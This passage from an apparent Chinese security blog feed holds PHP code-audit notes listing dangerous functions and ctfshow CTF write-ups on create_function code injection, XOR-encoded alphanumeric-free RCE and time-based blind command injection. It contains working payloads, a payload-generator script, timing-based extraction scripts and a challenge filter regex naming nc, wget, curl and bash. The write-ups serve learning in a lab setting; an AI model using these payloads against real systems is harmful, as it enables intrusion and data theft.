</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">var_dump</span><br></pre></td></tr></table></figure></div>

<ul>
<li>查看上下文内容</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">get_defined_functions <span class="comment"># 返回所有已定义函数的数组</span></span><br><span class="line">get_defined_vars  <span class="comment"># 获取当前php运行的所有变量</span></span><br><span class="line">get_defined_constants <span class="comment">#  返回所有常量的关联数组，键是常量名，值是常量值</span></span><br><span class="line">get_included_files <span class="comment"># 返回被 include 和 require 文件名的 array</span></span><br><span class="line">get_loaded_extensions  <span class="comment"># 返回所有编译并加载模块名的 array</span></span><br><span class="line">get_extenstion_funcs  <span class="comment"># 返回模块函数名称的数组</span></span><br><span class="line">get_declared_classes <span class="comment"># 返回由已定义类的名字所组成的数组</span></span><br><span class="line">get_declared_interfaces <span class="comment"># 返回一个数组包含所有已声明的接口</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>查看函数调用过程</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">debug_backtrace</span><br><span class="line">debug_print_backtrace</span><br></pre></td></tr></table></figure></div>

<ul>
<li>XDebug手工调试</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">xdebug_call_file <span class="comment">#获取调用当前函数的文件</span></span><br><span class="line">xdebug_call_line <span class="comment">#获取当前函数的文件行</span></span><br><span class="line">xdebug_call_function <span class="comment">#获取调用当前函数的函数</span></span><br><span class="line">xdebug_dump_superglobals <span class="comment">#获取所有超全局变量</span></span><br><span class="line">xdebug_get_monitored_functions <span class="comment">#监控函数调用</span></span><br></pre></td></tr></table></figure></div>

<h1 id="PHP服务架构"><a href="#PHP服务架构" class="headerlink" title="PHP服务架构"></a>PHP服务架构</h1><p>PHP运行模式 (Sapi)</p>
<ul>
<li><p>CLI</p>
</li>
<li><p>CGI</p>
</li>
<li><p>PHP Built-in Webserver</p>
<ul>
<li>php -S localhost:9090 （当前目录启动基于php的服务）</li>
</ul>
</li>
<li><p><strong>Apache php_mod</strong></p>
</li>
<li><p><strong>php-fpm(Fastcgi)</strong></p>
<ul>
<li>Nginx</li>
<li>IIS7+</li>
<li>Lighttpd</li>
</ul>
</li>
<li><p>IIS6 + ISAPI</p>
</li>
<li><p>Swoole</p>
</li>
</ul>
<h1 id="PHP安全配置"><a href="#PHP安全配置" class="headerlink" title="PHP安全配置"></a>PHP安全配置</h1><ul>
<li><p>影响PHP安全的全局配置</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">- magic_quotes_gpc: 5.3后废弃，5.4后移除</span><br><span class="line">- register_global: 4.2后默认为false</span><br><span class="line">- allow_url_include: 默认为False</span><br><span class="line">- allow_url_fopen: 默认true</span><br><span class="line">- request_order：5.3后从GPC改为GP</span><br><span class="line">- short_open_tag: 5.4+, 无论是否开启，&lt;?&#x3D;..？&gt;总是可以被执行的</span><br><span class="line">- safe_mode （5.4移除）</span><br><span class="line">- open_basedir 限制网站是否能访问哪些目录</span><br><span class="line">- disable_functions&#x2F;disable_classes</span><br><span class="line">-- enable_dl(5.2默认false)</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h1 id="PHP危险函数归纳"><a href="#PHP危险函数归纳" class="headerlink" title="PHP危险函数归纳"></a>PHP危险函数归纳</h1><ul>
<li>危险操作、函数、方法、变量</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>/<span class="keyword">require</span>/<span class="keyword">include_once</span>/<span class="keyword">require_once</span>/spl_autoload</span><br><span class="line">- <span class="keyword">eval</span>/assert/preg_replace/create_function</span><br><span class="line">- system/passthru/exec/shell_exec/popen/proc_open/pcntl_exec/dl/`ls`</span><br><span class="line">- file_get_contents/fread/readfile/file/highlight_file/show_source</span><br><span class="line">- file_put_contents/fwrite/mkdir/fputs</span><br><span class="line">- unlink/rmdir</span><br><span class="line">- move_uploaded_file/copy/rename</span><br><span class="line">- curl_exec/file_get_contents/readfile/fopen</span><br><span class="line">- extract/parse_str/$$</span><br><span class="line">- simplexml_load_file/simplexml_load_string/SimpleXMLElement/DOMDocument/xml_parse</span><br><span class="line">- var_dump/print_r/<span class="keyword">exit</span>/<span class="keyword">die</span></span><br><span class="line">- unserialize</span><br><span class="line">- urldecode/iconv/mb_convert_encoding/stripslashes/base64_decode/substr</span><br></pre></td></tr></table></figure></div>

<h1 id="遇到不懂的函数和类"><a href="#遇到不懂的函数和类" class="headerlink" title="遇到不懂的函数和类"></a>遇到不懂的函数和类</h1><ul>
<li><p><a href="https://www.php.net/" target="_blank" rel="noopener">官方文档php.net</a></p>
</li>
<li><p><a href="https://stackoverflow.com/" target="_blank" rel="noopener">https://stackoverflow.com/</a> &amp;&amp; Google.com</p>
</li>
<li><p>查找漏洞源码练习</p>
</li>
</ul>
<p><strong>XZ.Aliyun.com</strong></p>
<p><strong>Github.com</strong></p>
<p><strong>Wooyun历史漏洞</strong></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】php特性create_function的妙用</title>
    <url>/posts/168.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="create-function的利用姿势web147"><a href="#create-function的利用姿势web147" class="headerlink" title="create_function的利用姿势web147"></a>create_function的利用姿势web147</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'ctf'</span>]))&#123;</span><br><span class="line">    $ctfshow = $_POST[<span class="string">'ctf'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$ctfshow)) &#123;</span><br><span class="line">        $ctfshow(<span class="string">''</span>,$_GET[<span class="string">'show'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里正则简单的就和\W一样的意思大小写字母数字还有下划线不能使用，我们能随意控制show的内容，这里可以使用create_function()</p>
<blockquote>
<p>string create_function ( string args , string args , string code )</p>
<p>string $args 变量部分<br>string $code 方法代码部分</p>
</blockquote>
<p><strong>也可以使用<a href="https://gylq.gitee.io/gylq-navigation/">导航</a>中regex101进行正则自动判断分析</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211010105049748.png" alt="image-20211010105049748"></p>
</blockquote>
<p>例如</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$gylq = create_function(<span class="string">'$gylq'</span>,<span class="string">'echo $gylq;'</span>);</span><br><span class="line"></span><br><span class="line">$gylq(<span class="string">"test1"</span>.<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//相当于</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gylq</span><span class="params">($gylq)</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> $gylq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gylq(<span class="string">"test2"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">test1</span><br><span class="line">test2</span><br></pre></td></tr></table></figure></div>

<p>利用方法也就是我们可以控制show的第二个参数即如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$gylq = create_function(<span class="string">'$gylq'</span>,<span class="string">'echo $gylq;&#125;phpinfo();//'</span>);</span><br><span class="line">$gylq(<span class="string">'test1'</span>);</span><br><span class="line"><span class="comment">/*利用介绍如下</span></span><br><span class="line"><span class="comment">    如果我们把第二个参数输入的是'echo 123;&#125;phpinfo();//'</span></span><br><span class="line"><span class="comment">    用方括号闭合方法，并成功执行phpinfo</span></span><br><span class="line"><span class="comment">也就是如下的形式，成功绕过得到phpinfo函数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gylq</span><span class="params">($gylq)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $gylq;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211010161323480.png" alt="image-20211010161323480"></p>
</blockquote>
<p>正则，我们可以用\进行绕过，正好\在php里代表默认命名空间</p>
<blockquote>
<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法</p>
</blockquote>
<p>所以这里可以直接用\绕过，构造<strong>payload</strong>来RCE</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST传入</span><br><span class="line">ctf&#x3D;\create_function</span><br><span class="line"></span><br><span class="line">GET传入</span><br><span class="line">?show&#x3D;echo 1;&#125;system(&#39;tac flag.php&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211010162616149.png" alt="image-20211010162616149"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】php特性无字母数字异或RCE wp</title>
    <url>/posts/169.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="无字母数字命令执行web141"><a href="#无字母数字命令执行web141" class="headerlink" title="无字母数字命令执行web141"></a>无字母数字命令执行web141</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = (String)$_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = (String)$_GET[<span class="string">'v3'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^\W+$/'</span>, $v3))&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">"return $v1$v3$v2;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"$v1$v3$v2 = "</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>分析源代码，这里用了正则表达式<code>/^\W+$/</code>，把数字和字母还有下划线给ban了，之前无字母数字的webshell我们用异或来吧（或运算，异或，取反等等都可以）</p>
<p><strong>也可以使用<a href="https://gylq.gitee.io/gylq-navigation/">导航</a>中regex101进行正则自动判断分析</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211010105049748.png" alt="image-20211010105049748"></p>
</blockquote>
<p>简单异或形成的原因分析一下，写个php代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">eval($_GET[&#39;a&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>当我们传入a的参数，输入的值进行异或，可以得到一些字符串比如，可以构造字符phpinfo，但使用的是ascii码中32-126之间的字符，除去大小写字母和数字还有下划线，能够构造字母</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;echo ((&quot;%0b%08%0b%09%0e%06%0f&quot;)^(&quot;%7b%60%7b%60%60%60%60&quot;));</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211010105753504.png" alt="image-20211010105753504"></p>
</blockquote>
<p>所以，当我们使用phpinfo时，可以直接构造如下payload，成功命令执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;echo ((&quot;%0b%08%0b%09%0e%06%0f&quot;)^(&quot;%7b%60%7b%60%60%60%60&quot;))();</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211010105919095.png" alt="image-20211010105919095"></p>
</blockquote>
<p>由于一个个筛选很麻烦，所以写一个脚本直接生成异或之后的字符，如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># # Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># # Date:2021/10/10</span></span><br><span class="line"><span class="comment"># # blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成可用的字符</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">general_rce</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    preg = <span class="string">'[a-zA-Z0-9]'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg,chr(i),re.I) <span class="keyword">or</span> re.match(preg,chr(j),re.I)):</span><br><span class="line">                x = i ^ j</span><br><span class="line">                <span class="keyword">if</span> x &gt;= <span class="number">32</span> <span class="keyword">and</span> x &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">'%'</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">'%'</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(x) + <span class="string">' '</span> + a + <span class="string">' '</span> + b + <span class="string">'\n'</span>)</span><br><span class="line">    f = open(<span class="string">'xor_rce.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的命令在生成的txt中进行匹配</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(arg)</span>:</span></span><br><span class="line">    s1 = <span class="string">""</span></span><br><span class="line">    s2 = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">"xor_rce.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">''</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = (<span class="string">"((\""</span> + s1 + <span class="string">"\")"</span> + <span class="string">"^"</span> + <span class="string">"(\""</span> + s2 + <span class="string">"\"))"</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    general_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">"\n[+] your function: "</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">"exit"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">"[+] your command: "</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">"\n[*] result: \n"</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>

<p>当我们想要执行system ls 时，直接执行这个脚本获得</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211010110127469.png" alt="image-20211010110127469"></p>
</blockquote>
<p>接着复制上去就可以看到结果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;((&quot;%08%02%08%08%05%0d&quot;)^(&quot;%7b%7b%7b%7c%60%60&quot;))((&quot;%0c%08&quot;)^(&quot;%60%7b&quot;));</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211010110152542.png" alt="image-20211010110152542"></p>
</blockquote>
<p>所以我们分析一下这题，可以发现v1和v2都为数字可以不用管，但是想要执行return，前面的v1后面得跟一个连接符，不然无法执行命令，所以v3前面加个连接符/*-|都行，我用除号，就可以构造payload，读取flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;&#x2F;((&quot;%08%02%08%08%05%0d&quot;)^(&quot;%7b%7b%7b%7c%60%60&quot;))((&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;)^(&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;));</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211010110401754.png" alt="image-20211010110401754"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】Linux命令行注入无回显盲注 wp</title>
    <url>/posts/170.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="命令行之无回显注入web139"><a href="#命令行之无回显注入web139" class="headerlink" title="命令行之无回显注入web139"></a>命令行之无回显注入web139</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>禁止了文件写入权限，所以tee已经无法使用，这里考虑用if和sleep来进行命令行盲注</strong></p>
</blockquote>
<p>利用shell编程的if判断语句配合awk以及cut命令来获取flag</p>
<p>1、awk逐行获取数据</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211006092556115.png" alt="image-20211006092556115"></p>
</blockquote>
<p>2、cut命令逐列获取单个字符第一行</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211006092655551.png" alt="image-20211006092655551"></p>
</blockquote>
<p>3、利用条件判断语句是否执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">if [ $(cat flag.txt | awk NR&#x3D;&#x3D;1 | cut -c 2) &#x3D;&#x3D; l ]; then echo &quot;got it&quot;;fi</span><br><span class="line"></span><br><span class="line">php中&#96;可以当exec使用</span><br><span class="line">if [ &#96;cat flag.txt | awk NR&#x3D;&#x3D;1 | cut -c 2&#96; &#x3D;&#x3D; l ; then echo &quot;got it&quot;;fi</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211007211803396.png" alt="image-20211007211803396"></p>
</blockquote>
<p>4、写一个脚本判断根目录的名称</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># -- coding:UTF-8 --</span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># Date:2021&#x2F;10&#x2F;07</span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;89e63d88-3a32-4b94-a05d-0270f5795caf.challenge.ctf.show:8080&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">p_result &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 5):</span><br><span class="line">    for j in range(1, 68):</span><br><span class="line">        for k in range(32, 128):</span><br><span class="line">            k &#x3D; chr(k)</span><br><span class="line">            payload &#x3D; &quot;?c&#x3D;&quot; + &quot;if [ &#96;ls &#x2F; | awk NR&#x3D;&#x3D;&#123;&#125; | cut -c &#123;&#125;&#96; &#x3D;&#x3D; &#123;&#125; ]; then sleep 2;fi&quot;.format(i,j,k)</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url&#x3D;url + payload, timeout&#x3D;(1.5, 1.5))</span><br><span class="line">            except:</span><br><span class="line">                p_result +&#x3D; k</span><br><span class="line">                print(&quot;【-】 ls &#x2F;盲注:]&quot;.format(j))</span><br><span class="line">                print(&quot;【*】 p_result is context&quot;)</span><br><span class="line">                print(p_result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p_result +&#x3D; &quot; &quot;</span><br></pre></td></tr></table></figure></div>

<p>5、经过长时间的注入，发现flag的目录/f149_15_h3r3，接着改一下数值和命令直接拿flag，跑起来很慢，这点需要注意。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/10/07</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://89e63d88-3a32-4b94-a05d-0270f5795caf.challenge.ctf.show:8080/"</span></span><br><span class="line"></span><br><span class="line">p_result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">68</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            k = chr(k)</span><br><span class="line">            payload = <span class="string">"?c="</span> + <span class="string">"if [ `cat /f149_15_h3r3 | awk NR==&#123;&#125; | cut -c &#123;&#125;` == &#123;&#125; ]; then sleep 2;fi"</span>.format(i,j,k)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url + payload, timeout=(<span class="number">1.5</span>, <span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                p_result += k</span><br><span class="line">                print(<span class="string">"【-】 ls /盲注:]"</span>.format(j))</span><br><span class="line">                print(<span class="string">"【*】 p_result is context"</span>)</span><br><span class="line">                print(p_result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p_result += <span class="string">" "</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211007222132772.png" alt="image-20211007222132772"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
